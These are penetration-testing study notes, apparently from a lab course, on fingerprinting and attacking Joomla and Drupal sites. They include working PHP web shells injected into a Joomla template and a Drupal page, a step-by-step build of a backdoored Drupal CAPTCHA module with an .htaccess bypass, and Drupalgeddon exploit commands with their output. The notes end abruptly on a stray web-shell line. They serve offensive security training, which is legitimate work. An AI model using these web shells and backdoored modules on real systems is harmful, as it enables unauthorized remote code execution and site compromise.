# Joomla

## About Joomla

- Released in August 2005 is another free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more.
- It is written in PHP and uses MySQL in the backend. Like WordPress, Joomla can be enhanced with over 7,000 extensions and over 1,000 templates.
- There are up to 2.5 million sites on the internet running Joomla

## 1. Discovery/Footprinting Joomla

When encountering a potential Joomla site during testing, confirm and fingerprint it using multiple methods. Check page source for the meta generator tag containing "Joomla! - Open Source Content Management".

**Version fingerprinting methods:**

1. **README.txt**: `curl -s http://site/README.txt | head -n 5` shows version in opening lines
2. **administrator/manifests/files/joomla.xml**: Contains detailed version info (e.g., 3.9.4)
3. **JavaScript files**: Check `media/system/js/` directory
4. **cache.xml**: Located at `plugins/system/cache/cache.xml` for approximate version
5. **Favicon**: Sometimes reveals Joomla (though not always reliable)

- Knowing the version and installed themes/plugins helps identify vulnerabilities and misconfigurations.

We can often fingerprint Joomla by looking at the page source, which tells us that we are dealing with a Joomla site:
```
[!bash!]$ curl -s http://dev.inlanefreight.local/ | grep Joomla

	<meta name="generator" content="Joomla! - Open Source Content Management" />


<SNIP>
```

# Attacking Joomla

## 1. Abusing Built-In Functionality

After identifying a Joomla site, gaining admin access allows remote code execution through built-in functionality. Using leaked or default credentials (e.g., `admin:admin`), log into the admin backend at `/administrator`. Navigate to Templates → select a template (like `protostar`) → edit a page (like `error.php`) to inject PHP code for RCE.

**Step-by-Step RCE Process:**

**1. Login to Admin Backend**
- URL: `http://dev.inlanefreight.local/administrator`

**2. Fix Display Issue (if needed)**
- Error: "An error has occurred. Call to a member function format() on null"
- Navigate to: `index.php?option=com_plugins`
- Disable: "Quick Icon - PHP Version Check" plugin
- This allows control panel to display properly

**3. Access Templates Menu**
- Location: Bottom left under "Configuration"
- Click: "Templates"
- URL: `index.php?option=com_templates`

**4. Select Template**
- Choose template (e.g., "protostar") under "Template" column
- Brings up: "Templates: Customise" page
- URL: `index.php?option=com_templates&view=template&id=506`

**5. Edit Template File**
- Click on page to view source
- Choose: `error.php` (or another file)
- URL: `index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D`

**6. Inject PHP Code**
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
- Non-standard parameter name for security
- Click: "Save & Close"

**7. Verify Code Execution**
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Once code execution is achieved, upgrade to interactive reverse shell for privilege escalation or lateral movement.

**Post-Exploitation:**
- Upgrade to interactive reverse shell
- Look for privilege escalation vectors
- Focus on lateral movement in corporate network

**Documentation & Cleanup:**
- **CRITICAL**: Document in report appendices:
  - Filename
  - File hash
  - Location
- **ALWAYS remove web shell after use**
- Include cleanup details in final report

## 2. Leveraging Known Vulnerabilities

Joomla has 426+ CVE vulnerabilities, but not all are exploitable or have public PoCs. Like WordPress, critical RCE vulnerabilities in Joomla core are rare—most exploit-db entries (1,400+) target Joomla extensions rather than core.

**Example: CVE-2019-10945 (Joomla 3.9.4)**
- **Vulnerability**: Directory traversal and authenticated file deletion
- **Affected versions**: Joomla 1.5.0 through 3.9.4
- **Released**: March 2019 (outdated but still found in enterprises)
- **Exploit**: Python script requires admin credentials (`--url`, `--username`, `--password`, `--dir`)

**Exploit Usage:**
```bash
python2.7 joomla_dir_trav.py \
  --url "http://dev.inlanefreight.local/administrator/" \
  --username admin \
  --password admin \
  --dir /
```

**Required Flags:**
- `--url`: Admin portal URL
- `--username`: Admin username
- `--password`: Admin password
- `--dir`: Directory to list/target

- **Impact**: 
  - List webroot and directory contents
  - Access sensitive files (configs, credentials)
  - Delete files (not recommended, can cause damage)

**Limitation**: Requires admin credentials, so it's only useful if admin portal isn't externally accessible. With admin creds and external access, direct RCE via template editing is more effective.

Organizations with poor asset inventories may unknowingly run vulnerable, outdated Joomla versions.

**Pentesting Considerations:**

**When Useful:**
- Admin portal NOT accessible externally
- Have admin credentials but can't login directly
- Need to enumerate filesystem

**When NOT Useful:**
- Admin portal accessible from outside
- Can already login as admin
- Better option: Direct RCE via template editing (previous section)

**Research Process:**
1. Identify Joomla version during enumeration
2. Check Joomla downloads page for release date
3. Research CVEs for that version
4. Find exploit scripts (exploit-db, GitHub)
5. Understand exploit requirements and limitations
6. Determine if exploit fits assessment scenario

# Drupal

## 1. Discovery/Footprinting Drupal

During external pentests, identifying non-WordPress/Joomla CMS sites is crucial as CMS platforms are "juicy" targets. Drupal can be identified through multiple indicators:

**Identification Methods:**
1. **Header/Footer**: "Powered by Drupal" message
2. **Logo**: Standard Drupal branding
3. **Files**: `CHANGELOG.txt` or `README.txt` presence
4. **Page source**: Meta generator tag
5. **robots.txt**: References to `/node`
6. **Node structure**: URIs formatted as `/node/<nodeid>`

**Quick identification via curl:**
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
# Returns: <meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
```

**Node-based content indexing:**
Drupal uses nodes to index all content (blog posts, polls, articles, etc.). Page URIs typically follow `/node/<nodeid>` format (e.g., `/node/1`). This is especially useful for identifying Drupal when custom themes hide standard indicators.

**Default User Types:**
1. **Administrator**: Complete control over the site
2. **Authenticated User**: Can login and perform operations (add/edit articles) based on permissions
3. **Anonymous**: All visitors; read-only access by default

**Note**: Not all Drupal installations look the same or expose login pages externally.

---

## 2. Enumeration Drupal

After discovering Drupal, perform manual and automated enumeration to identify version numbers and installed plugins. Newer Drupal versions block access to `CHANGELOG.txt` and `README.txt` by default, requiring alternative enumeration methods.

**Manual Version Detection via CHANGELOG.txt:**
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
# Output: Drupal 7.57, 2018-02-21
```

Modern installations return 404 for this file, necessitating other approaches.

**Method 1: CHANGELOG.txt (Older Versions)**
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```
- Works on older Drupal installations
- Example result: "Drupal 7.57, 2018-02-21"
- Uses: `curl`, `grep`, `sed`, `head` for parsing

**Limitation - Modern Versions:**
```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
# Returns: 404 Not Found
```
- Newer Drupal blocks `CHANGELOG.txt` by default
- Also blocks `README.txt`
- Requires alternative enumeration

# Attacking Drupal

Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script.

## 1. Leveraging the PHP Filter Module

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."

<img width="1252" height="423" alt="image" src="https://github.com/user-attachments/assets/1fd028fa-dcdc-47a8-94fe-2f0e052d934b" />

From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.

<img width="1254" height="388" alt="image" src="https://github.com/user-attachments/assets/d2a22394-d1cd-4555-8920-223e4e4ab9b9" />

We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common `cmd` to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard `system($_GET['cmd'])`; we open up ourselves up to a "drive-by" attacker potentially coming across our web shell

**Note:** The MD5 hash representation can originate from any hashed command or string that isn't easily guessable and is not present in any dictionary wordlists used for directory brute-forcing.

```
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

<img width="1253" height="864" alt="image" src="https://github.com/user-attachments/assets/da4551b6-5854-4557-9623-abbad96b7ed1" />

We also want to make sure to set `Text format` drop-down to `PHP code`. After clicking save, we will be redirected to the new page, in this example `http://drupal-qa.inlanefreight.local/node/3`. 

Once saved, we can either request execute commands in the browser by appending `?dcfdd5e021a869fcc6dfaef8bf31377e=id` to the end of the URL to run the `id` command or use `cURL` on the command line. From here, we could use a bash one-liner to obtain reverse shell access.

```
[!bash!]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.

`[!bash!]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`

Once downloaded go to `Administration` > `Reports` > `Available updates`.

**Note:** Location may differ based on the Drupal version and may be under the Extend menu.

<img width="1251" height="560" alt="image" src="https://github.com/user-attachments/assets/c286a2aa-5442-4bea-8db9-e6f02d9874d2" />

From here, click on `Browse`, select the file from the directory we downloaded it to, and then click `Install`.

Once the module is installed, we can click on `Content` and create a new basic page. Again, be sure to select `PHP code` from the `Text format` dropdown. Also, once we are done, we should remove or disable the `PHP Filter` module and delete any pages that we created to gain remote code execution.

## 2. Uploading a Backdoored Module

Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as `CAPTCHA`. Scroll down and copy the link for the tar.gz `archive`.

Download the archive and extract its contents:
```
[!bash!]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
[!bash!]$ tar xvf captcha-8.x-1.2.tar.gz
```

Create a PHP web shell with the contents:
```
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
```
[!bash!]$ mv shell.php .htaccess captcha
[!bash!]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```

Assuming we have `administrative access` to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.

<img width="1249" height="475" alt="image" src="https://github.com/user-attachments/assets/e2b313dd-de03-4f8d-ab3d-dced35c680cd" />

Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.

```
[!bash!]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 3. Leveraging Known Vulnerabilities

Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed `Drupalgeddon`. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

* `CVE-2014-3704`, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
* `CVE-2018-7600`, also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
* `CVE-2018-7602`, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

### Drupalgeddon

As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this PoC script. Once an admin user is added, we could log in and enable the `PHP Filter` module to achieve remote code execution.

Running the script with the -h flag shows us the help menu.
```
[!bash!]$ python2.7 drupalgeddon.py
Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS


Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password
```

Here we see that we need to supply the target URL and a username and password for our new admin account. Let's run the script and see if we get a new admin user.
```
[!bash!]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

```
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
